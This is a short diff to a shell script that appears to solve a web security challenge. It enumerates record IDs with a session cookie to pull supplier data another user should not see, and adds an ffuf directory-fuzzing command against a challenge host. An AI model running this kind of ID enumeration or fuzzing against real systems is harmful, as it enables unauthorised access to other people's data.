@@ -5,3 +5,7 @@ for id in $(seq 1 60); do
   r=$(curl -s -b "$COOKIE" -L -X POST "$BASE/movimientos/$id" | grep -oiE "Proveedor #[0-9]+:[^<]*movimientos[^<]*")
   [ -n "$r" ] && echo "id=$id -> $r"
 done
+
+
+BASE='https://chl-3080b01d-bb9c-4e54-bf7f-06f64c3e6d9a-cuentas-claras.b.softwareseguro.com.ar'
+ffuf -u "$BASE/FUZZ" -w /usr/share/wordlists/dirb/common.txt -fc 404 -t 40
